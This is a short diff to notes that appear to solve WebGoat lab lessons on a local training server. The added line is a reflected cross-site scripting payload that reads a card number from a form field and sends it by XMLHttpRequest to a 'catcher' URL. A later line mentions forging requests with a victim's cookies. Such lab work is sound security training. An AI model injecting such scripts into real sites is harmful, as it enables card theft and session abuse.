@@ -13,7 +13,7 @@ Part2:
 URL is: http://localhost:8090/WebGoat/catcher?src=1406352188&menu=900&PROPERTY=yes&card=
 Card number is captured from 'field2'
 URL Encode the script and input as field 1 in parameters
-
+http://localhost:8090/WebGoat/start.mvc#attack/1406352188/900?field2=123&field1=<script type="text/javascript">document.getElementById('message').innerHTML = "Congratulations. You have successfully completed this lesson.";var attackSite = "http://localhost:8090/WebGoat/catcher?src=1406352188&menu=900&PROPERTY=yes&card=";var cardNum = document.getElementsByName("field2")[0];var totalString = attackSite + cardNum.value;var encodedUrl = totalString.replace(/ /g,'');var xmlHttp = new XMLHttpRequest();xmlHttp.open("GET", encodedUrl, false);xmlHttp.send(null);</script>
 
 Part3:
 Exploit message field, makes GET request from page, attempting to use the victims cookies
